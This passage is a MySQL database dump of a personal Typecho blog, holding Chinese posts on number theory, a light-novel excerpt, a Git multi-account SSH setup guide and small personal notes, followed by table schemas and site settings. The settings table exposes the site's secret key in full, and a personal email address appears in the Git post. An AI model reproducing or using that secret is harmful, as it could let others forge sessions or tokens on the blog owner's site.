是更复杂的数时推导余数序列循环周期的方法，得到了一个非常漂亮的结果：在 1 到 n 的范围内有多少个数和 n 互质（包括 1 在内）， a 的 i 次方除以 n 的余数序列就会有一个多长的周期。这个经典的结论就叫做“ Euler 定理”。作为历史上最高产的数学家之一， Euler 的一生当中发现的定理实在是太多了。为了把上述定理和其他的“ Euler 定理”区别开来，有时也称它为“ Fermat – Euler 定理”。这是一个非常深刻的定理，它有一些非常具有启发性的证明方法。考虑到在后文的讲解中这个定理不是必需的，因此这里就不详说了。\r\n\r\n    这些东西有什么用呢？没有什么用。几千年来，数论一直没有任何实际应用，数学家们研究数论的动力完全来源于数字本身的魅力。不过，到了 1970 年左右，情况有了戏剧性的变化。\r\n\r\n    有的朋友可能要说了，你怎么赖皮呢，“没有任何实际应用”，那刚才的 Mignotte 秘密共享方案算什么？其实， Mignotte 秘密共享方案已经是很后来的事了。秘密共享本来远没那么复杂，为了使得只要 5 个人中半数以上的人在场就可以解开绝密文件，总部可以把绝密文件锁进一个特殊的机械装置里，装置上有三个一模一样的锁孔，并配有 5 把完全相同且不可复制的钥匙。只有把其中任意 3 把钥匙同时插进钥匙孔并一起转动，才能打开整个装置。把 5 把钥匙分发给 5 名特工，目的就直接达到了。因而，通常情况下我们并不需要动用 Mignotte 秘密共享方案。那么，利用中国剩余定理费尽周折弄出的 Mignotte 秘密共享方案，意义究竟何在呢？这种新的秘密共享方案直到 1983 年才被提出，想必是为了解决某个以前不曾有过的需求。 20 世纪中后期究竟出现了什么？答案便是——计算机网络。锁孔方案只适用于物理世界，不能用于网络世界。为了在网络世界中共享秘密，我们需要一种纯信息层面的、只涉及数据交换的新方法， Mignotte 秘密共享方案才应运而生。\r\n\r\n    数论知识开始焕发新生，一切都是因为这该死的计算机网络。',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(13,'这个小说开头好奇怪!','13',1448938440,1449205812,'<!--markdown-->    老司机发给我一篇小说，开头好黄啊！　  \r\n\r\n    “果然还是夜夜最棒呢。又可爱又厉害又细心还不烦人！”\r\n\r\n　　最后那个不对吧，雷真在心中吐槽道。\r\n\r\n　　无意识间抱着的物体柔软而温暖，令他有种难以言喻的舒适感。这到底是什么东西？貌似不是枕头啊……？\r\n\r\n　　即便是五感堪比野生动物的雷真，也在与灰蔷薇西丝玛激战后筋疲力尽，很正常地睡糊涂了。他用迷糊的大脑思考起来。昨晚到底发生了什么事呢——\r\n\r\n　　记得好像是草草结束了修复工作，参加了仅有形式的夜会，然后就回到了宿舍。\r\n\r\n　　在怪物居内什大肆暴虐之后，自然也没有观众会留下，雷真只是尽了“待机义务”而已。昨天索涅奇卡将日轮和芙蕾打败，剩下的只有洛基和夏儿。今晚应该就要赌上马格纳斯的挑战权和他俩战斗了吧。\r\n\r\n　　并且胜出的人，将在明天向马格纳斯挑战。\r\n\r\n　　雷真的头脑渐渐清醒了过来，却依然用脸蹭着枕头（？），这时，他突然感到了杀气。枕头（？）对其作出了反应：\r\n\r\n　　“雷真还在睡觉！快请回吧！”\r\n\r\n　　这话里明显带刺……嗯，认命吧。这根本不是什么枕头。\r\n\r\n　　虽然希望这只是南柯一梦，但某人冰冷的声音让雷真的愿望化为了泡影。\r\n\r\n　　“如传闻一般是个人渣呢。任务都还没完成就沉溺在了肉欲之中。”\r\n\r\n　　火垂的声音中透着露骨的轻蔑。\r\n\r\n　　她是马格纳斯“战队”的一员。还和雷真有着不小的因缘。\r\n\r\n　　火垂已经站在床边了。搭档之所以会允许她离得这么近，是因为雷真把搭档当成了抱枕。夜夜没有乱动，而是欣喜地被雷真抱着。\r\n\r\n　　雷真轻轻离开夜夜，像是辩解般地说道：\r\n\r\n　　“……虽然这个状况百口难辩，但还是容我说一句吧。我也是到极限了。”\r\n\r\n　　“原来如此。理性的极限——”\r\n\r\n　　“是体力的极限啊！对手可是魔女啊？！精力早就消耗殆尽了啊！”\r\n\r\n　　“雷真？！你什么时候又和魔女勾搭上了~~~~~~~~”\r\n\r\n　　“夜夜是超越想象力的极限了！话说，别跑到我的床上来啊！”\r\n\r\n　　“就算你这么说，明明都那么激烈地渴・求・夜・夜・了（心）。”\r\n\r\n　　夜夜很害臊似的捂住脸颊扭动着身体。火垂的视线也变得越来越冰冷。雷真认定想要解除误会已是不可能了，于是慢吞吞地下了床。\r\n\r\n　　窗外还暗暗的。时间大概也就是清晨五点多吧。\r\n\r\n　　“精神头不错嘛，火垂。大清早的找我什么事？”\r\n\r\n\r\n\r\n　　“稍微动动脑子就应该知道了吧。我是来带你去见校长的。”\r\n\r\n　　“啊……是让我赶快把那宝贝交给他吗。”\r\n\r\n　　索涅奇卡让与自己的秘宝“虚无石”，必须要交给校长。\r\n\r\n　　都到了这个时候，雷真才感到了犹豫。虚无石是“夏娃的心脏”的原型，还是关乎神性机巧诞生的关键。硝子由于拒绝向日本军部提交它，被迫亡命结社。难得石头脱离卢瑟福之手，让他失而复得真的好吗？\r\n\r\n　　（可是，交出石头，或许就能救夜夜了。）\r\n\r\n　　约定就是这样。交了石头，学院就会入手“忘却之水”。只要有了那个灵药，就能在找到治疗方法之前停住夜夜的时间。\r\n\r\n　　雷真正逡巡间，身着烹饪服的少女现身了。\r\n\r\n　　“雷真大人，早餐已经准备好了。”\r\n\r\n　　是夜夜的姐姐伊吕利。她似乎早已发现了火垂，朝她投去了锐利的目光：\r\n\r\n　　“你在这里做什么。擅闯男性的寝室简直荒谬至极。况且，连招呼都不跟我打一声……也太见外了吧。”\r\n\r\n　　她好像是在闹别扭。雷真几乎摔倒，但依旧说道：\r\n\r\n　　“火垂是校长的使者。我现在去一下。夜夜，准备一下。”\r\n\r\n　　“是！”\r\n\r\n　　夜夜开心地举手答道，接着整理起了衣装。\r\n\r\n　　“伊吕利，你先照应着火垂，我去洗把脸。”\r\n\r\n　　“哎，啊，是——火、火垂，那个，最近，怎么样？”\r\n\r\n　　伊吕利开始了莫名生硬的闲聊。火垂好像有些恼，但似乎又非完全厌烦的样子，简短地答着话。\r\n\r\n　　雷真看着她俩的互动感到有些欣慰，他离开房间，向盥洗室走去。\r\n\r\n　　他洗了洗脸，又望向了室外。夜幕的黑暗已然变淡，迷蒙的朝霭正在漫延。\r\n\r\n　　（……看来今天会变得很长啊）\r\n\r\n　　不，是会让它变长。雷真的脑中已经在整理着应该完成的计划了。\r\n\r\n　　可以的话，他是希望能尽量无伤地撑过这“漫长的一天”的。如若不然就无法在夜会上胜出，也就无法打倒天全，更不可能成为魔王了。\r\n    \r\n   自己给自己立flag，这真的好吗！',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(14,'福利福利！','14',1446887820,1449225835,'<!--markdown-->学校的学长跟我推荐一部有趣的动漫，我还没去看呢！\r\n但是听说得到油水管上去看，叫<Happy Tree Friends>\r\n听说美国人民的童年都伴随着这部动画，国民级大作耶！！！\r\n学长说一定要去看下哦！\r\n\r\n> 这个动画系列的主要内容是森林里一群可爱的小动物之间发生的小故事，动物们性格各异，形象天真而可爱。\r\n\r\n\r\n\r\n====看完之后====\r\n大！家！一！定！要！去！看！\r\n值！！！',0,1,NULL,'post','publish',NULL,2,'1','1','1',0),(15,'Git多帐号攻略','15',1446196800,1449227477,'<!--markdown--># 一心一意-单帐号\r\n首先，生成属于自己的密钥\r\n\r\nssh-keygen -t rsa -b 4096 -C \"evilddog@gmail.com\"\r\n默认在 ~/.ssh 目录下就会生成两个文件 id_rsa(600) 和 id_rsa.pub(644)\r\n\r\n然后在Github上添加公钥，也就把公钥文件id_rsa.pub里面的内容复制一份给Github。\r\n\r\n设置完成后，通过\r\n\r\nssh -T git@github.com\r\n验证。\r\n\r\n\r\n# 脚踏两条船\r\n同样的，得先有密钥。不同的是，指定一个新的名字。\r\n\r\nssh-keygen -t rsa -b 4096 -C \"evilddog@gmail.com\" -f ~/.ssh/evilddog\r\n需要注意邮箱和密钥名\r\n\r\n然后在\r\n~/.ssh/config\r\n中进行修改。\r\n比如同时有两个GitHub帐户用于分开约炮。\r\n\r\n### GitHub 1 ###\r\nHost evilddog.github.com\r\n    User git\r\n    HostName github.com\r\n    IdentityFile ~/.ssh/evilddog\r\n \r\n### GitHub 2 ###\r\nHost lightless.github.com\r\n    User git\r\n    HostName github.com\r\n    IdentityFile ~/.ssh/lightless\r\n\r\n在 git push 的时候，仓库名相应改成Host定义的名字，ssh就会去找相对应的IdentityFile文件。 一般查看git remote -v 看看默认的origin是不是已经更改成上面的Host了，或者其它远程仓库。\r\n\r\nPS. Host只是在验证的时候选择正确的私钥，会被替换成HostName对应的地址的。\r\n\r\n# 开后宫\r\nGithub因为某些原因很慢啊，很慢啊，很慢啊。 有时候用下Coding之类的还是很好的啊。\r\n\r\n### GitHub ###\r\nHost github.com\r\n    User git\r\n    Hostname github.com\r\n    PreferredAuthentications publickey\r\n    IdentityFile ~/.ssh/id_rsa\r\n \r\n### Coding ###\r\nHost git.coding.net\r\n    User git\r\n    Hostname git.coding.net\r\n    PreferredAuthentications publickey\r\n    IdentityFile ~/.ssh/coding',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(16,'Axent Wear这个耳机好棒啊！','16',1448793780,1449226193,'<!--markdown-->Axent Wear这个耳机好棒啊！切绘我好喜欢啊！\r\n带着猫耳出行，嘻嘻嘻！\r\n\r\n\r\n![AW][1]\r\n\r\n\r\n  [1]: http://www.axentwear.com/assets/headphones_float-c16497a2261cec2b66317cc689319a93.jpg',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(17,'秋活要完!','17',1449227354,1449227354,'<!--markdown-->上班了之后，我都没时间去陪我的小姐姐们了。\r\n\r\n秋活都快完了我还没捞到新的小姐姐，\r\n切绘我不高兴！\r\n切绘我不高兴！\r\n切绘我不高兴！\r\n切绘我不高兴！\r\n切绘我不高兴！\r\n切绘我不高兴！\r\n双十一那天去南京玩了，双十二再剁手吧！',0,1,NULL,'post','publish',NULL,0,'1','1','1',0);
/*!40000 ALTER TABLE `kirieblog_contents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kirieblog_fields`
--

DROP TABLE IF EXISTS `kirieblog_fields`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_fields` (
  `cid` int(10) unsigned NOT NULL,
  `name` varchar(200) NOT NULL,
  `type` varchar(8) DEFAULT 'str',
  `str_value` text,
  `int_value` int(10) DEFAULT '0',
  `float_value` float DEFAULT '0',
  PRIMARY KEY (`cid`,`name`),
  KEY `int_value` (`int_value`),
  KEY `float_value` (`float_value`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_fields`
--

LOCK TABLES `kirieblog_fields` WRITE;
/*!40000 ALTER TABLE `kirieblog_fields` DISABLE KEYS */;
/*!40000 ALTER TABLE `kirieblog_fields` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kirieblog_metas`
--

DROP TABLE IF EXISTS `kirieblog_metas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_metas` (
  `mid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) DEFAULT NULL,
  `slug` varchar(200) DEFAULT NULL,
  `type` varchar(32) NOT NULL,
  `description` varchar(200) DEFAULT NULL,
  `count` int(10) unsigned DEFAULT '0',
  `order` int(10) unsigned DEFAULT '0',
  `parent` int(10) unsigned DEFAULT '0',
  PRIMARY KEY (`mid`),
  KEY `slug` (`slug`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_metas`
--

LOCK TABLES `kirieblog_metas` WRITE;
/*!40000 ALTER TABLE `kirieblog_metas` DISABLE KEYS */;
INSERT INTO `kirieblog_metas` VALUES (1,'默认分类','default','category','只是一个默认分类',15,1,0);
/*!40000 ALTER TABLE `kirieblog_metas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kirieblog_options`
--

DROP TABLE IF EXISTS `kirieblog_options`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_options` (
  `name` varchar(32) NOT NULL,
  `user` int(10) unsigned NOT NULL DEFAULT '0',
  `value` text,
  PRIMARY KEY (`name`,`user`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_options`
--

LOCK TABLES `kirieblog_options` WRITE;
/*!40000 ALTER TABLE `kirieblog_options` DISABLE KEYS */;
INSERT INTO `kirieblog_options` VALUES ('theme',0,'default'),('theme:default',0,'a:2:{s:7:\"logoUrl\";N;s:12:\"sidebarBlock\";a:5:{i:0;s:15:\"ShowRecentPosts\";i:1;s:18:\"ShowRecentComments\";i:2;s:12:\"ShowCategory\";i:3;s:11:\"ShowArchive\";i:4;s:9:\"ShowOther\";}}'),('timezone',0,'28800'),('lang',0,NULL),('charset',0,'UTF-8'),('contentType',0,'text/html'),('gzip',0,'0'),('generator',0,'Typecho 1.0/14.10.10'),('title',0,'Kirie酱的小窝'),('description',0,'kirie~'),('keywords',0,'kirie,blog'),('rewrite',0,'1'),('frontPage',0,'recent'),('frontArchive',0,'0'),('commentsRequireMail',0,'1'),('commentsWhitelist',0,'0'),('commentsRequireURL',0,'0'),('commentsRequireModeration',0,'0'),('plugins',0,'a:0:{}'),('commentDateFormat',0,'F jS, Y \\a\\t h:i a'),('siteUrl',0,'http://kirie.hack123.pw'),('defaultCategory',0,'1'),('allowRegister',0,'0'),('defaultAllowComment',0,'1'),('defaultAllowPing',0,'1'),('defaultAllowFeed',0,'1'),('pageSize',0,'1'),('postsListSize',0,'10'),('commentsListSize',0,'10'),('commentsHTMLTagAllowed',0,NULL),('postDateFormat',0,'Y-m-d'),('feedFullText',0,'1'),('editorSize',0,'350'),('autoSave',0,'0'),('markdown',0,'1'),('commentsMaxNestingLevels',0,'5'),('commentsPostTimeout',0,'2592000'),('commentsUrlNofollow',0,'1'),('commentsShowUrl',0,'1'),('commentsMarkdown',0,'0'),('commentsPageBreak',0,'0'),('commentsThreaded',0,'1'),('commentsPageSize',0,'20'),('commentsPageDisplay',0,'last'),('commentsOrder',0,'ASC'),('commentsCheckReferer',0,'1'),('commentsAutoClose',0,'0'),('commentsPostIntervalEnable',0,'1'),('commentsPostInterval',0,'60'),('commentsShowCommentOnly',0,'0'),('commentsAvatar',0,'1'),('commentsAvatarRating',0,'G'),('commentsAntiSpam',0,'1'),('routingTable',0,'a:26:{i:0;a:25:{s:5:\"index\";a:6:{s:3:\"url\";s:1:\"/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:8:\"|^[/]?$|\";s:6:\"format\";s:1:\"/\";s:6:\"params\";a:0:{}}s:7:\"archive\";a:6:{s:3:\"url\";s:6:\"/blog/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:13:\"|^/blog[/]?$|\";s:6:\"format\";s:6:\"/blog/\";s:6:\"params\";a:0:{}}s:2:\"do\";a:6:{s:3:\"url\";s:22:\"/action/[action:alpha]\";s:6:\"widget\";s:9:\"Widget_Do\";s:6:\"action\";s:6:\"action\";s:4:\"regx\";s:32:\"|^/action/([_0-9a-zA-Z-]+)[/]?$|\";s:6:\"format\";s:10:\"/action/%s\";s:6:\"params\";a:1:{i:0;s:6:\"action\";}}s:4:\"post\";a:6:{s:3:\"url\";s:24:\"/archives/[cid:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:26:\"|^/archives/([0-9]+)[/]?$|\";s:6:\"format\";s:13:\"/archives/%s/\";s:6:\"params\";a:1:{i:0;s:3:\"cid\";}}s:10:\"attachment\";a:6:{s:3:\"url\";s:26:\"/attachment/[cid:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:28:\"|^/attachment/([0-9]+)[/]?$|\";s:6:\"format\";s:15:\"/attachment/%s/\";s:6:\"params\";a:1:{i:0;s:3:\"cid\";}}s:8:\"category\";a:6:{s:3:\"url\";s:17:\"/category/[slug]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:25:\"|^/category/([^/]+)[/]?$|\";s:6:\"format\";s:13:\"/category/%s/\";s:6:\"params\";a:1:{i:0;s:4:\"slug\";}}s:3:\"tag\";a:6:{s:3:\"url\";s:12:\"/tag/[slug]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:20:\"|^/tag/([^/]+)[/]?$|\";s:6:\"format\";s:8:\"/tag/%s/\";s:6:\"params\";a:1:{i:0;s:4:\"slug\";}}s:6:\"author\";a:6:{s:3:\"url\";s:22:\"/author/[uid:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:24:\"|^/author/([0-9]+)[/]?$|\";s:6:\"format\";s:11:\"/author/%s/\";s:6:\"params\";a:1:{i:0;s:3:\"uid\";}}s:6:\"search\";a:6:{s:3:\"url\";s:19:\"/search/[keywords]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:23:\"|^/search/([^/]+)[/]?$|\";s:6:\"format\";s:11:\"/search/%s/\";s:6:\"params\";a:1:{i:0;s:8:\"keywords\";}}s:10:\"index_page\";a:6:{s:3:\"url\";s:21:\"/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:22:\"|^/page/([0-9]+)[/]?$|\";s:6:\"format\";s:9:\"/page/%s/\";s:6:\"params\";a:1:{i:0;s:4:\"page\";}}s:12:\"archive_page\";a:6:{s:3:\"url\";s:26:\"/blog/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:27:\"|^/blog/page/([0-9]+)[/]?$|\";s:6:\"format\";s:14:\"/blog/page/%s/\";s:6:\"params\";a:1:{i:0;s:4:\"page\";}}s:13:\"category_page\";a:6:{s:3:\"url\";s:32:\"/category/[slug]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:34:\"|^/category/([^/]+)/([0-9]+)[/]?$|\";s:6:\"format\";s:16:\"/category/%s/%s/\";s:6:\"params\";a:2:{i:0;s:4:\"slug\";i:1;s:4:\"page\";}}s:8:\"tag_page\";a:6:{s:3:\"url\";s:27:\"/tag/[slug]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:29:\"|^/tag/([^/]+)/([0-9]+)[/]?$|\";s:6:\"format\";s:11:\"/tag/%s/%s/\";s:6:\"params\";a:2:{i:0;s:4:\"slug\";i:1;s:4:\"page\";}}s:11:\"author_page\";a:6:{s:3:\"url\";s:37:\"/author/[uid:digital]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:33:\"|^/author/([0-9]+)/([0-9]+)[/]?$|\";s:6:\"format\";s:14:\"/author/%s/%s/\";s:6:\"params\";a:2:{i:0;s:3:\"uid\";i:1;s:4:\"page\";}}s:11:\"search_page\";a:6:{s:3:\"url\";s:34:\"/search/[keywords]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:32:\"|^/search/([^/]+)/([0-9]+)[/]?$|\";s:6:\"format\";s:14:\"/search/%s/%s/\";s:6:\"params\";a:2:{i:0;s:8:\"keywords\";i:1;s:4:\"page\";}}s:12:\"archive_year\";a:6:{s:3:\"url\";s:18:\"/[year:digital:4]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:19:\"|^/([0-9]{4})[/]?$|\";s:6:\"format\";s:4:\"/%s/\";s:6:\"params\";a:1:{i:0;s:4:\"year\";}}s:13:\"archive_month\";a:6:{s:3:\"url\";s:36:\"/[year:digital:4]/[month:digital:2]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:30:\"|^/([0-9]{4})/([0-9]{2})[/]?$|\";s:6:\"format\";s:7:\"/%s/%s/\";s:6:\"params\";a:2:{i:0;s:4:\"year\";i:1;s:5:\"month\";}}s:11:\"archive_day\";a:6:{s:3:\"url\";s:52:\"/[year:digital:4]/[month:digital:2]/[day:digital:2]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:41:\"|^/([0-9]{4})/([0-9]{2})/([0-9]{2})[/]?$|\";s:6:\"format\";s:10:\"/%s/%s/%s/\";s:6:\"params\";a:3:{i:0;s:4:\"year\";i:1;s:5:\"month\";i:2;s:3:\"day\";}}s:17:\"archive_year_page\";a:6:{s:3:\"url\";s:38:\"/[year:digital:4]/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:33:\"|^/([0-9]{4})/page/([0-9]+)[/]?$|\";s:6:\"format\";s:12:\"/%s/page/%s/\";s:6:\"params\";a:2:{i:0;s:4:\"year\";i:1;s:4:\"page\";}}s:18:\"archive_month_page\";a:6:{s:3:\"url\";s:56:\"/[year:digital:4]/[month:digital:2]/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:44:\"|^/([0-9]{4})/([0-9]{2})/page/([0-9]+)[/]?$|\";s:6:\"format\";s:15:\"/%s/%s/page/%s/\";s:6:\"params\";a:3:{i:0;s:4:\"year\";i:1;s:5:\"month\";i:2;s:4:\"page\";}}s:16:\"archive_day_page\";a:6:{s:3:\"url\";s:72:\"/[year:digital:4]/[month:digital:2]/[day:digital:2]/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:55:\"|^/([0-9]{4})/([0-9]{2})/([0-9]{2})/page/([0-9]+)[/]?$|\";s:6:\"format\";s:18:\"/%s/%s/%s/page/%s/\";s:6:\"params\";a:4:{i:0;s:4:\"year\";i:1;s:5:\"month\";i:2;s:3:\"day\";i:3;s:4:\"page\";}}s:12:\"comment_page\";a:6:{s:3:\"url\";s:53:\"[permalink:string]/comment-page-[commentPage:digital]\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:36:\"|^(.+)/comment\\-page\\-([0-9]+)[/]?$|\";s:6:\"format\";s:18:\"%s/comment-page-%s\";s:6:\"params\";a:2:{i:0;s:9:\"permalink\";i:1;s:11:\"commentPage\";}}s:4:\"feed\";a:6:{s:3:\"url\";s:20:\"/feed[feed:string:0]\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:4:\"feed\";s:4:\"regx\";s:17:\"|^/feed(.*)[/]?$|\";s:6:\"format\";s:7:\"/feed%s\";s:6:\"params\";a:1:{i:0;s:4:\"feed\";}}s:8:\"feedback\";a:6:{s:3:\"url\";s:31:\"[permalink:string]/[type:alpha]\";s:6:\"widget\";s:15:\"Widget_Feedback\";s:6:\"action\";s:6:\"action\";s:4:\"regx\";s:29:\"|^(.+)/([_0-9a-zA-Z-]+)[/]?$|\";s:6:\"format\";s:5:\"%s/%s\";s:6:\"params\";a:2:{i:0;s:9:\"permalink\";i:1;s:4:\"type\";}}s:4:\"page\";a:6:{s:3:\"url\";s:12:\"/[slug].html\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";s:4:\"regx\";s:22:\"|^/([^/]+)\\.html[/]?$|\";s:6:\"format\";s:8:\"/%s.html\";s:6:\"params\";a:1:{i:0;s:4:\"slug\";}}}s:5:\"index\";a:3:{s:3:\"url\";s:1:\"/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:7:\"archive\";a:3:{s:3:\"url\";s:6:\"/blog/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:2:\"do\";a:3:{s:3:\"url\";s:22:\"/action/[action:alpha]\";s:6:\"widget\";s:9:\"Widget_Do\";s:6:\"action\";s:6:\"action\";}s:4:\"post\";a:3:{s:3:\"url\";s:24:\"/archives/[cid:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:10:\"attachment\";a:3:{s:3:\"url\";s:26:\"/attachment/[cid:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:8:\"category\";a:3:{s:3:\"url\";s:17:\"/category/[slug]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:3:\"tag\";a:3:{s:3:\"url\";s:12:\"/tag/[slug]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:6:\"author\";a:3:{s:3:\"url\";s:22:\"/author/[uid:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:6:\"search\";a:3:{s:3:\"url\";s:19:\"/search/[keywords]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:10:\"index_page\";a:3:{s:3:\"url\";s:21:\"/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:12:\"archive_page\";a:3:{s:3:\"url\";s:26:\"/blog/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:13:\"category_page\";a:3:{s:3:\"url\";s:32:\"/category/[slug]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:8:\"tag_page\";a:3:{s:3:\"url\";s:27:\"/tag/[slug]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:11:\"author_page\";a:3:{s:3:\"url\";s:37:\"/author/[uid:digital]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:11:\"search_page\";a:3:{s:3:\"url\";s:34:\"/search/[keywords]/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:12:\"archive_year\";a:3:{s:3:\"url\";s:18:\"/[year:digital:4]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:13:\"archive_month\";a:3:{s:3:\"url\";s:36:\"/[year:digital:4]/[month:digital:2]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:11:\"archive_day\";a:3:{s:3:\"url\";s:52:\"/[year:digital:4]/[month:digital:2]/[day:digital:2]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:17:\"archive_year_page\";a:3:{s:3:\"url\";s:38:\"/[year:digital:4]/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:18:\"archive_month_page\";a:3:{s:3:\"url\";s:56:\"/[year:digital:4]/[month:digital:2]/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:16:\"archive_day_page\";a:3:{s:3:\"url\";s:72:\"/[year:digital:4]/[month:digital:2]/[day:digital:2]/page/[page:digital]/\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:12:\"comment_page\";a:3:{s:3:\"url\";s:53:\"[permalink:string]/comment-page-[commentPage:digital]\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}s:4:\"feed\";a:3:{s:3:\"url\";s:20:\"/feed[feed:string:0]\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:4:\"feed\";}s:8:\"feedback\";a:3:{s:3:\"url\";s:31:\"[permalink:string]/[type:alpha]\";s:6:\"widget\";s:15:\"Widget_Feedback\";s:6:\"action\";s:6:\"action\";}s:4:\"page\";a:3:{s:3:\"url\";s:12:\"/[slug].html\";s:6:\"widget\";s:14:\"Widget_Archive\";s:6:\"action\";s:6:\"render\";}}'),('actionTable',0,'a:0:{}'),('panelTable',0,'a:0:{}'),('attachmentTypes',0,'@image@'),('secret',0,'*yHa6W7n9qd3B0L8%Z@C@Xtu#u4oi4*g');
/*!40000 ALTER TABLE `kirieblog_options` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kirieblog_relationships`
--

DROP TABLE IF EXISTS `kirieblog_relationships`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_relationships` (
  `cid` int(10) unsigned NOT NULL,
  `mid` int(10) unsigned NOT NULL,
  PRIMARY KEY (`cid`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_relationships`
--

LOCK TABLES `kirieblog_relationships` WRITE;
/*!40000 ALTER TABLE `kirieblog_relationships` DISABLE KEYS */;
